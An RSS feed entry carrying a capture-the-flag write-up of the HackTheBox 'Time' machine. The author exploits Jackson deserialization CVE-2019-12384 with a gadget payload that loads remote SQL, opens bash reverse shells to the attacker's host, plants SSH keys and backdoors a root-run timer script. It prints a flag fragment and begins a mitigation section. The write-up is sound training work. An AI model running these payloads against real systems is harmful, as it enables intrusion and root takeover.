<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>Systemd-timer on Ef&#39;s log</title>
    <link>https://fahmifj.github.io/tags/systemd-timer/</link>
    <description>Recent content in Systemd-timer on Ef&#39;s log</description>
    <generator>Hugo -- gohugo.io</generator>
    <lastBuildDate>Sun, 09 May 2021 05:43:58 +0700</lastBuildDate><atom:link href="https://fahmifj.github.io/tags/systemd-timer/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>HackTheBox - Time</title>
      <link>https://fahmifj.github.io/hackthebox/time/</link>
      <pubDate>Sun, 09 May 2021 05:43:58 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/hackthebox/time/</guid>
      <description>Exploiting an insecure deserialization on Jackson library and how to mitigate it</description>
      <content:encoded><![CDATA[<p>Time from HackTheBox features a web application that provides JSON beautifier and validator services. Inserting some invalid inputs exposes the application&rsquo;s error message, indicating it uses the Jackson library. Searching for the error message on Google leads to a post about deserialization attack on Jackson. The attack is then reproduced to gain initial access. Enumerating on the system discovers a timer script that is executed by root every 10 seconds. The script is world-writable, allowing me to inject a malicious code and obtain a root shell.</p>
<h4 id="skills-learned">Skills Learned</h4>
<ul>
<li>Deserialization Attack on Jackson (CVE-2019-12384)</li>
<li>Exploiting Systemd timers</li>
<li>Mitigation of CVE-2019-12384</li>
</ul>
<h4 id="tools">Tools</h4>
<ul>
<li>Kali Linux (Attacking Machine) - <a href="https://www.kali.org/">https://www.kali.org/</a></li>
<li>Nmap - Preinstalled in Kali Linux</li>
</ul>
<h2 id="reconnaissance">Reconnaissance</h2>
<h3 id="nmap">Nmap</h3>
<p><code>nmap</code> discovers two open ports: SSH on port 22, and a HTTP web server on port 80.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">→ root@kali «time» «10.10.14.19» 
$ mkdir nmap<span class="p">;</span> nmap -sC -sV -oA nmap/10-initial-time 10.10.10.214 
Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-05-08 07:29 EDT
Nmap scan report <span class="k">for</span> 10.10.10.214
Host is up <span class="o">(</span>0.069s latency<span class="o">)</span>.
Not shown: <span class="m">998</span> closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
80/tcp open  http    Apache httpd 2.4.41 <span class="o">((</span>Ubuntu<span class="o">))</span>
<span class="p">|</span>_http-server-header: Apache/2.4.41 <span class="o">(</span>Ubuntu<span class="o">)</span>
<span class="p">|</span>_http-title: Online JSON parser
Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 27.18 seconds
</code></pre></div><h2 id="enumeration">Enumeration</h2>
<h3 id="tcp-80---website">TCP 80 - Website</h3>
<p>Visiting port 80 shows a website called &ldquo;Online JSON Beautifier &amp; Validator&rdquo;.</p>
<p><div class="img-container"><img src="imgs/image-20210508184016068.png" alt="image-20210508184016068"  /></div>
</p>
<p>Clicking on the drop down menu, it provides two options: &ldquo;Beautify&rdquo; and &ldquo;Validate (beta!)&rdquo;.</p>
<p><div class="img-container"><img src="imgs/image-20210508184059429.png" alt="image-20210508184059429"  /></div>
</p>
<h4 id="testing-inputs">Testing Inputs</h4>
<p>I submitted <code>{&quot;test&quot;: &quot;iamf&quot;}</code> to the input box and clicked the &ldquo;Process&rdquo; button. As expected, the beautify option just a JSON beautifier like <a href="https://stedolan.github.io/jq/">jq</a>.</p>
<p><div class="img-container"><img src="imgs/image-20210508184420130.png" alt="image-20210508184420130"  /></div>
</p>
<p>I submitted the same input on &ldquo;Validate (beta!)&rdquo;, but this time it returns the following error.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">Validation failed: Unhandled Java exception: com.fasterxml.jackson.databind.exc.MismatchedInputException: Unexpected token (START_OBJECT), expected START_ARRAY: need JSON Array to contain As.WRAPPER_ARRAY type information for class java.lang.Object
</code></pre></div><p><div class="img-container"><img src="imgs/image-20210508184904577.png" alt="image-20210508184904577"  /></div>
</p>
<p>I found this <a href="https://www.baeldung.com/jackson-inheritance#1-global-default-typing">site</a> while searching for the error message on Google. It turned out it wanted an array input, so I copied the sample input from that site and pasted it to the validator.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="p">[</span> 
<span class="s2">&#34;org.baeldung.jackson.inheritance.Truck&#34;</span><span class="p">,</span>
<span class="p">{</span> <span class="nt">&#34;make&#34;</span><span class="p">:</span> <span class="s2">&#34;Isuzu&#34;</span><span class="p">,</span> <span class="nt">&#34;model&#34;</span><span class="p">:</span> <span class="s2">&#34;NQR&#34;</span><span class="p">,</span><span class="nt">&#34;payloadCapacity&#34;</span><span class="p">:</span> <span class="mf">7500.0</span> <span class="p">}</span>
<span class="p">]</span>
</code></pre></div><p>And now it returns a different error message.</p>
<p><div class="img-container"><img src="imgs/image-20210508195850042.png" alt="image-20210508195850042"  /></div>
</p>
<p>And that&rsquo;s because it probably can&rsquo;t find <code>org.baeldung.jackson.inheritance.Truck</code> since I made it up.</p>
<h4 id="finding-vulnerability">Finding Vulnerability</h4>
<p>I might be able to inject the &ldquo;<code>org.baeldung.jackson.inheritance.Truck</code>&rdquo; with a java gadget class for deserialization attack, and after searching around about deserialization topics on Jackson, I found this two blog posts about Jackson RCE:</p>
<ul>
<li><a href="https://adamcaudill.com/2017/10/04/exploiting-jackson-rce-cve-2017-7525/">Exploiting the Jackson RCE: CVE-2017-7525 - Adam Caudill</a></li>
<li><a href="https://blog.doyensec.com/2019/07/22/jackson-gadgets.html">Jackson gadgets - Anatomy of a vulnerability · Doyensec&rsquo;s Blog</a></li>
</ul>
<p>However, the post on Doyensec&rsquo;s blog is newer (2019 vs 2017), so I dig into that blog. The researcher on that blog uses <code>ch.qos.logback.core.db.DriverManagerConnectionSource</code> as his gadget class, leveraging the alias feature from the H2 database to execute arbitrary code. This research is classified as CVE-2019-12384.</p>
<p>Below is the example payload used.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="p">[</span><span class="s2">&#34;ch.qos.logback.core.db.DriverManagerConnectionSource&#34;</span><span class="p">,</span> <span class="p">{</span><span class="nt">&#34;url&#34;</span><span class="p">:</span><span class="s2">&#34;jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM &#39;http://localhost:8000/inject.sql&#39;&#34;</span><span class="p">}]</span>
</code></pre></div><h2 id="foothold">Foothold</h2>
<h3 id="shell-as-pericles">Shell as pericles</h3>
<h4 id="exploiting-jackson-cve-2019-12384">Exploiting Jackson CVE-2019-12384</h4>
<p>I&rsquo;ll use the research from Doyensec&rsquo;s blog above as my reference.</p>
<p>First, I&rsquo;ll create a copy of the <code>inject.sql</code> file that is used by the researcher.</p>
<p><code>inject.sql</code>:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="n">CREATE</span> <span class="n">ALIAS</span> <span class="n">SHELLEXEC</span> <span class="n">AS</span> <span class="n">$$</span> <span class="n">String</span> <span class="nf">shellexec</span><span class="o">(</span><span class="n">String</span> <span class="n">cmd</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">java</span><span class="o">.</span><span class="na">io</span><span class="o">.</span><span class="na">IOException</span> <span class="o">{</span>
	<span class="n">String</span><span class="o">[]</span> <span class="n">command</span> <span class="o">=</span> <span class="o">{</span><span class="s">&#34;bash&#34;</span><span class="o">,</span> <span class="s">&#34;-c&#34;</span><span class="o">,</span> <span class="n">cmd</span><span class="o">};</span>
	<span class="n">java</span><span class="o">.</span><span class="na">util</span><span class="o">.</span><span class="na">Scanner</span> <span class="n">s</span> <span class="o">=</span> <span class="k">new</span> <span class="n">java</span><span class="o">.</span><span class="na">util</span><span class="o">.</span><span class="na">Scanner</span><span class="o">(</span><span class="n">Runtime</span><span class="o">.</span><span class="na">getRuntime</span><span class="o">().</span><span class="na">exec</span><span class="o">(</span><span class="n">command</span><span class="o">).</span><span class="na">getInputStream</span><span class="o">()).</span><span class="na">useDelimiter</span><span class="o">(</span><span class="s">&#34;\\A&#34;</span><span class="o">);</span>
	<span class="k">return</span> <span class="n">s</span><span class="o">.</span><span class="na">hasNext</span><span class="o">()</span> <span class="o">?</span> <span class="n">s</span><span class="o">.</span><span class="na">next</span><span class="o">()</span> <span class="o">:</span> <span class="s">&#34;&#34;</span><span class="o">;</span>  <span class="o">}</span>
<span class="n">$$</span><span class="o">;</span>
<span class="n">CALL</span> <span class="nf">SHELLEXEC</span><span class="o">(</span><span class="err">&#39;</span><span class="n">id</span> <span class="o">&gt;</span> <span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">tcp</span><span class="o">/</span><span class="n">10</span><span class="o">.</span><span class="na">10</span><span class="o">.</span><span class="na">14</span><span class="o">.</span><span class="na">19</span><span class="o">/</span><span class="n">9000</span><span class="err">&#39;</span><span class="o">)</span>
</code></pre></div><p>Then, I&rsquo;ll setup a Python web server to host the SQL file and an <code>nc</code> listener to catch the request.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">→ root@kali «time» «10.10.14.19» 
$ python3 -m http.server <span class="m">80</span>
Serving HTTP on 0.0.0.0 port <span class="m">80</span> <span class="o">(</span>http://0.0.0.0:80/<span class="o">)</span> ...
</code></pre></div><p>Now I&rsquo;ll use the following JSON payload and submit it to the validator.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="p">[</span><span class="s2">&#34;ch.qos.logback.core.db.DriverManagerConnectionSource&#34;</span><span class="p">,</span> <span class="p">{</span><span class="nt">&#34;url&#34;</span><span class="p">:</span><span class="s2">&#34;jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM &#39;http://10.10.14.19/inject.sql&#39;&#34;</span><span class="p">}]</span>
</code></pre></div><p>Within a few seconds, my Python web server receives a request for <code>inject.sql</code>, and my listener captures the output of the <code>id</code> command.</p>
<p><div class="img-container"><img src="imgs/image-20210508204955144.png" alt="image-20210508204955144"  /></div>
</p>
<p>Knowing this, I can weaponize the <code>inject.sql</code> file to send myself a shell, and then perform the same procedure as above.</p>
<h4 id="weaponization---reverse-shell">Weaponization - Reverse Shell</h4>
<p>Now with the following <code>inject.sql</code>,</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="n">CREATE</span> <span class="n">ALIAS</span> <span class="n">SHELLEXEC</span> <span class="n">AS</span> <span class="n">$$</span> <span class="n">String</span> <span class="nf">shellexec</span><span class="o">(</span><span class="n">String</span> <span class="n">cmd</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">java</span><span class="o">.</span><span class="na">io</span><span class="o">.</span><span class="na">IOException</span> <span class="o">{</span>
	<span class="n">String</span><span class="o">[]</span> <span class="n">command</span> <span class="o">=</span> <span class="o">{</span><span class="s">&#34;bash&#34;</span><span class="o">,</span> <span class="s">&#34;-c&#34;</span><span class="o">,</span> <span class="n">cmd</span><span class="o">};</span>
	<span class="n">java</span><span class="o">.</span><span class="na">util</span><span class="o">.</span><span class="na">Scanner</span> <span class="n">s</span> <span class="o">=</span> <span class="k">new</span> <span class="n">java</span><span class="o">.</span><span class="na">util</span><span class="o">.</span><span class="na">Scanner</span><span class="o">(</span><span class="n">Runtime</span><span class="o">.</span><span class="na">getRuntime</span><span class="o">().</span><span class="na">exec</span><span class="o">(</span><span class="n">command</span><span class="o">).</span><span class="na">getInputStream</span><span class="o">()).</span><span class="na">useDelimiter</span><span class="o">(</span><span class="s">&#34;\\A&#34;</span><span class="o">);</span>
	<span class="k">return</span> <span class="n">s</span><span class="o">.</span><span class="na">hasNext</span><span class="o">()</span> <span class="o">?</span> <span class="n">s</span><span class="o">.</span><span class="na">next</span><span class="o">()</span> <span class="o">:</span> <span class="s">&#34;&#34;</span><span class="o">;</span>  <span class="o">}</span>
<span class="n">$$</span><span class="o">;</span>
<span class="n">CALL</span> <span class="nf">SHELLEXEC</span><span class="o">(</span><span class="err">&#39;</span><span class="n">bash</span> <span class="o">-</span><span class="n">i</span> <span class="o">&gt;&amp;</span> <span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">tcp</span><span class="o">/</span><span class="n">10</span><span class="o">.</span><span class="na">10</span><span class="o">.</span><span class="na">14</span><span class="o">.</span><span class="na">19</span><span class="o">/</span><span class="n">9000</span> <span class="n">0</span><span class="o">&gt;&amp;</span><span class="n">1</span><span class="err">&#39;</span><span class="o">)</span>
</code></pre></div><p>I can obtain an interactive shell.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «time» «10.10.14.19» 
$ nc -nvlp <span class="m">9000</span>            
listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">9000</span> ...
connect to <span class="o">[</span>10.10.14.19<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.214<span class="o">]</span> <span class="m">42496</span>
bash: cannot <span class="nb">set</span> terminal process group <span class="o">(</span>944<span class="o">)</span>: Inappropriate ioctl <span class="k">for</span> device
bash: no job control in this shell
pericles@time:/var/www/html$ 
</code></pre></div><p><div class="img-container"><img src="imgs/image-20210508205643332.png" alt="image-20210508205643332"  /></div>
</p>
<h4 id="upgrade-to-ssh">Upgrade to SSH</h4>
<p>With current access, I can put my public key to the <code>authorized_keys</code> file.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">pericles@time:/home/pericles$ mkdir .ssh
pericles@time:/home/pericles$
pericles@time:/home/pericles$ <span class="nb">echo</span> <span class="s1">&#39;ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPmWTx2r3W2mHnCnKmoJCnkrj6mXxSIGq3E5ks1g+moK&#39;</span> &gt; .ssh/authorized_keys
</code></pre></div><p>Now I can login as <code>pericles</code> with my SSH private key.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «time» «10.10.14.19» 
$ ssh pericles@10.10.10.214 
Welcome to Ubuntu 20.04 LTS <span class="o">(</span>GNU/Linux 5.4.0-52-generic x86_64<span class="o">)</span>

...&lt;SNIP&gt;...
  System load:             0.0
  Usage of /:              21.2% of 27.43GB
  Memory usage:            16%
  Swap usage:              0%
  Processes:               <span class="m">235</span>
  Users logged in:         <span class="m">0</span>
  IPv4 address <span class="k">for</span> ens160: 10.10.10.214
  IPv6 address <span class="k">for</span> ens160: dead:beef::250:56ff:feb9:a553

...&lt;SNIP&gt;...
Last login: Fri Oct <span class="m">23</span> 09:19:19 <span class="m">2020</span> from 10.10.14.5
pericles@time:~$ id
<span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>pericles<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>pericles<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1000<span class="o">(</span>pericles<span class="o">)</span>
</code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="shell-as-root">Shell as root</h3>
<h4 id="internal-enumeration">Internal Enumeration</h4>
<p><code>pericles</code> is the only user on this box.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">pericles@time:/home/pericles$ cat /etc/passwd <span class="p">|</span> grep sh$
cat /etc/passwd <span class="p">|</span> grep sh$
root:x:0:0:root:/root:/bin/bash
pericles:x:1000:1000:Pericles:/home/pericles:/bin/bash
</code></pre></div><p>While searching files owned by <code>pericles</code>, I spotted a script called <code>timer_backup.sh</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">pericles@time:~$ find / -type f -user pericles 2&gt;/dev/null <span class="p">|</span>grep -v <span class="s1">&#39;proc\|sys&#39;</span>
/usr/bin/timer_backup.sh
/dev/shm/payloadds9LXy
/home/pericles/.gnupg/trustdb.gpg
/home/pericles/.gnupg/pubring.kbx
/home/pericles/.bashrc
...&lt;SNIP&gt;...
</code></pre></div><p>The script is backing up the website contents in <code>/var/www/html</code> to the root home directory.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">pericles@time:~$ cat /usr/bin/timer_backup.sh
<span class="c1">#!/bin/bash</span>
zip -r website.bak.zip /var/www/html <span class="o">&amp;&amp;</span> mv website.bak.zip /root/backup.zip
</code></pre></div><p>Interestingly, that script is writable by others.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">pericles@time:~$ ls -l /usr/bin/timer_backup.sh 
-rwxrw-rw- <span class="m">1</span> pericles pericles <span class="m">88</span> Apr <span class="m">10</span> 21:05 /usr/bin/timer_backup.sh
</code></pre></div><p>I searched other file related to the script, and found out there is a timer owned by root.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">pericles@time:~$ find / -type f -name <span class="s2">&#34;timer_backup*&#34;</span> -ls 2&gt;/dev/null
   <span class="m">795750</span>      <span class="m">4</span> -rw-r--r--   <span class="m">1</span> root     root          <span class="m">214</span> Oct <span class="m">23</span> 06:46 /etc/systemd/system/timer_backup.timer
   <span class="m">787186</span>      <span class="m">4</span> -rw-r--r--   <span class="m">1</span> root     root          <span class="m">159</span> Oct <span class="m">23</span> 05:59 /etc/systemd/system/timer_backup.service
  <span class="m">1317302</span>      <span class="m">4</span> -rwxrw-rw-   <span class="m">1</span> pericles pericles       <span class="m">88</span> Apr <span class="m">10</span> 21:10 /usr/bin/timer_backup.sh
</code></pre></div><p><code>timer_backup.timer</code> requires <code>timer_backup.service</code>,</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">pericles@time:~$ cat /etc/systemd/system/timer_backup.timer 
<span class="o">[</span>Unit<span class="o">]</span>
<span class="nv">Description</span><span class="o">=</span>Backup of the website
<span class="nv">Requires</span><span class="o">=</span>timer_backup.service

<span class="o">[</span>Timer<span class="o">]</span>
<span class="nv">Unit</span><span class="o">=</span>timer_backup.service
<span class="c1">#OnBootSec=10s</span>
<span class="c1">#OnUnitActiveSec=10s</span>
<span class="nv">OnUnitInactiveSec</span><span class="o">=</span>10s
<span class="nv">AccuracySec</span><span class="o">=</span>1ms

<span class="o">[</span>Install<span class="o">]</span>
<span class="nv">WantedBy</span><span class="o">=</span>timers.target
</code></pre></div><p>and what <code>timer_backup.service</code> doing is it restarts <code>web_backup.service</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">pericles@time:~$ cat /etc/systemd/system/timer_backup.service 
<span class="o">[</span>Unit<span class="o">]</span>
<span class="nv">Description</span><span class="o">=</span>Calls website backup
<span class="nv">Wants</span><span class="o">=</span>timer_backup.timer
<span class="nv">WantedBy</span><span class="o">=</span>multi-user.target

<span class="o">[</span>Service<span class="o">]</span>
<span class="nv">ExecStart</span><span class="o">=</span>/usr/bin/systemctl restart web_backup.service
</code></pre></div><p><code>web_backup.service</code> executes the <code>timer_backup.sh</code> script which is owned by <code>pericles</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">pericles@time:~$ cat /etc/systemd/system/web_backup.service
<span class="o">[</span>Unit<span class="o">]</span>
<span class="nv">Description</span><span class="o">=</span>Creates backups of the website

<span class="o">[</span>Service<span class="o">]</span>
<span class="nv">ExecStart</span><span class="o">=</span>/bin/bash /usr/bin/timer_backup.sh
</code></pre></div><h4 id="exploiting-timer_backupsh">Exploiting timer_backup.sh</h4>
<p>With writable access, I can put a <code>bash</code> reverse shell in <code>timer_backup.sh</code>, and then setup a <code>nc</code> listener.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">pericles@time:~$ <span class="nb">echo</span> <span class="s1">&#39;bash -i &gt;&amp; /dev/tcp/10.10.14.19/9002 0&gt;&amp;1&#39;</span> &gt;&gt; /usr/bin/timer_backup.sh 
pericles@time:~$ 
pericles@time:~$ cat /usr/bin/timer_backup.sh 
<span class="c1">#!/bin/bash</span>
zip -r website.bak.zip /var/www/html <span class="o">&amp;&amp;</span> mv website.bak.zip /root/backup.zip
bash -i &gt;<span class="p">&amp;</span> /dev/tcp/10.10.14.72/9002 0&gt;<span class="p">&amp;</span><span class="m">1</span>
</code></pre></div><p>Within a few seconds, I have a root shell on my listener, but the problem is that shell is somehow exited by itself.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «time» «10.10.14.19» 
$ rlwrap nc -nvlp <span class="m">9002</span>
listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">9002</span> ...
connect to <span class="o">[</span>10.10.14.72<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.214<span class="o">]</span> <span class="m">57648</span>
bash: cannot <span class="nb">set</span> terminal process group <span class="o">(</span>411032<span class="o">)</span>: Inappropriate ioctl <span class="k">for</span> device
bash: no job control in this shell
root@time:/# 
root@time:/# <span class="nb">exit</span>
</code></pre></div><p>So I repeated the steps, but this time, I immediately injected my public key to the root&rsquo;s <code>authorized_keys</code> file.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «time» «10.10.14.19» 
$ nc -nvlp <span class="m">9002</span>                          
listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">9002</span> ...
connect to <span class="o">[</span>10.10.14.19<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.214<span class="o">]</span> <span class="m">34182</span>
bash: cannot <span class="nb">set</span> terminal process group <span class="o">(</span>65312<span class="o">)</span>: Inappropriate ioctl <span class="k">for</span> device
bash: no job control in this shell
root@time:/#  <span class="nb">echo</span> <span class="s1">&#39;ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPmWTx2r3W2mHnCnKmoJCnkrj6mXxSIGq3E5ks1g+moK&#39;</span> &gt; /root/.ssh/authorized_keys
&lt;rj6mXxSIGq3E5ks1g+moK<span class="err">&#39;</span> &gt; /root/.ssh/authorized_keys
root@time:/# <span class="nb">exit</span>
</code></pre></div><p>After that, I can login as root via SSH.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «time» «10.10.14.19» 
$ ssh root@10.10.10.214
Welcome to Ubuntu 20.04 LTS <span class="o">(</span>GNU/Linux 5.4.0-52-generic x86_64<span class="o">)</span>

...&lt;SNIP&gt;...
  System load:             0.0
  Usage of /:              21.2% of 27.43GB
  Memory usage:            16%
  Swap usage:              0%
  Processes:               <span class="m">235</span>
  Users logged in:         <span class="m">0</span>
  IPv4 address <span class="k">for</span> ens160: 10.10.10.214
  IPv6 address <span class="k">for</span> ens160: dead:beef::250:56ff:feb9:a553


...&lt;SNIP&gt;...
Last login: Tue Feb  <span class="m">9</span> 14:41:33 <span class="m">2021</span>
root@time:~# id
<span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
root@time:~# cut -c-16 root.txt 
27375f967f43232f
</code></pre></div><h2 id="extras">Extras</h2>
<p>In this extras, I&rsquo;ll take a look into the vulnerable code that allows me to gain a remote code execution, and then I&rsquo;ll try to patch it.</p>
<h3 id="cve-2019-12384">CVE-2019-12384</h3>
<h4 id="causes">Causes</h4>
<p>According to <a href="https://snyk.io/vuln/SNYK-JAVA-COMFASTERXMLJACKSONCORE-450917">this site</a>, in order to successfully exploit a Jackson deserialization vulnerability several conditions must be met.</p>
<p><div class="img-container"><img src="imgs/image-20210509215030250.png" alt="image-20210509215030250"  /></div>
</p>
<p>The first condition is fulfilled by the <code>index.php</code> file (<code>/var/www/html/index.php</code>). I have control on the user input.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
<span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;data&#39;</span><span class="p">])){</span>
        <span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;mode&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;mode&#39;</span><span class="p">]</span> <span class="o">===</span> <span class="s2">&#34;2&#34;</span><span class="p">){</span>
                <span class="nv">$filename</span> <span class="o">=</span> <span class="nx">tempnam</span><span class="p">(</span><span class="s2">&#34;/dev/shm&#34;</span><span class="p">,</span> <span class="s2">&#34;payload&#34;</span><span class="p">);</span>
                <span class="nv">$myfile</span> <span class="o">=</span> <span class="nx">fopen</span><span class="p">(</span><span class="nv">$filename</span><span class="p">,</span> <span class="s2">&#34;w&#34;</span><span class="p">)</span> <span class="k">or</span> <span class="k">die</span><span class="p">(</span><span class="s2">&#34;Unable to open file!&#34;</span><span class="p">);</span>
                <span class="nv">$txt</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;data&#39;</span><span class="p">];</span> <span class="c1">// Condition #1,  $txt controlled by user. no filter
</span><span class="c1"></span>                <span class="nx">fwrite</span><span class="p">(</span><span class="nv">$myfile</span><span class="p">,</span> <span class="nv">$txt</span><span class="p">);</span> 
                <span class="nx">fclose</span><span class="p">(</span><span class="nv">$myfile</span><span class="p">);</span>
                <span class="nx">exec</span><span class="p">(</span><span class="s2">&#34;/usr/bin/jruby /opt/json_project/parse.rb </span><span class="si">$filename</span><span class="s2"> 2&gt;&amp;1&#34;</span><span class="p">,</span> <span class="nv">$cmdout</span><span class="p">,</span> <span class="nv">$ret</span><span class="p">);</span>
                <span class="nx">unlink</span><span class="p">(</span><span class="nv">$filename</span><span class="p">);</span>
                <span class="k">if</span><span class="p">(</span><span class="nv">$ret</span> <span class="o">===</span> <span class="mi">0</span><span class="p">){</span>
                        <span class="nv">$output</span> <span class="o">=</span> <span class="s1">&#39;&lt;pre&gt;Validation successful!&lt;/pre&gt;&#39;</span><span class="p">;</span>
                <span class="p">}</span>
                <span class="k">else</span><span class="p">{</span>
                        <span class="nv">$output</span> <span class="o">=</span> <span class="s1">&#39;&lt;pre&gt;Validation failed: &#39;</span> <span class="o">.</span> <span class="nv">$cmdout</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">.</span> <span class="s1">&#39;&lt;/pre&gt;&#39;</span><span class="p">;</span>
                <span class="p">}</span>
        <span class="p">}</span>
        <span class="k">else</span><span class="p">{</span>
                <span class="nv">$json_ugly</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;data&#39;</span><span class="p">];</span>
                <span class="nv">$json_pretty</span> <span class="o">=</span> <span class="nx">json_encode</span><span class="p">(</span><span class="nx">json_decode</span><span class="p">(</span><span class="nv">$json_ugly</span><span class="p">),</span> <span class="nx">JSON_PRETTY_PRINT</span><span class="p">);</span>
                <span class="nv">$output</span> <span class="o">=</span> <span class="s1">&#39;&lt;pre&gt;&#39;</span><span class="o">.</span><span class="nv">$json_pretty</span><span class="o">.</span><span class="s1">&#39;&lt;/pre&gt;&#39;</span><span class="p">;</span>
        <span class="p">}</span>

<span class="p">}</span>
<span class="cp">?&gt;</span><span class="err">
</span><span class="err">...&lt;SNIP&gt;...
</span></code></pre></div><p>The second condition fulfilled by the parser itself (<code>/opt/json_project/parse.rb</code>). It uses &ldquo;Default typing&rdquo;.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="nb">require</span> <span class="s1">&#39;java&#39;</span>

<span class="no">Dir</span><span class="o">[</span><span class="s2">&#34;/opt/json_project/classpath/*.jar&#34;</span><span class="o">].</span><span class="n">each</span> <span class="k">do</span> <span class="o">|</span><span class="n">f</span><span class="o">|</span>
      <span class="nb">require</span> <span class="n">f</span>
<span class="k">end</span>

<span class="n">java_import</span> <span class="s1">&#39;com.fasterxml.jackson.databind.ObjectMapper&#39;</span>
<span class="n">java_import</span> <span class="s1">&#39;com.fasterxml.jackson.databind.SerializationFeature&#39;</span>
<span class="n">f</span> <span class="o">=</span> <span class="no">File</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="no">ARGV</span><span class="o">[</span><span class="mi">0</span><span class="o">]</span><span class="p">)</span>
<span class="n">content</span> <span class="o">=</span> <span class="n">f</span>
<span class="nb">puts</span> <span class="n">content</span>

<span class="n">mapper</span> <span class="o">=</span> <span class="no">ObjectMapper</span><span class="o">.</span><span class="n">new</span>
<span class="n">mapper</span><span class="o">.</span><span class="n">enableDefaultTyping</span><span class="p">()</span> <span class="c1"># Condition #2, the uses of &#34;default typing&#34;.</span>
<span class="n">mapper</span><span class="o">.</span><span class="n">configure</span><span class="p">(</span><span class="no">SerializationFeature</span><span class="o">::</span><span class="no">FAIL_ON_EMPTY_BEANS</span><span class="p">,</span> <span class="kp">false</span><span class="p">);</span>
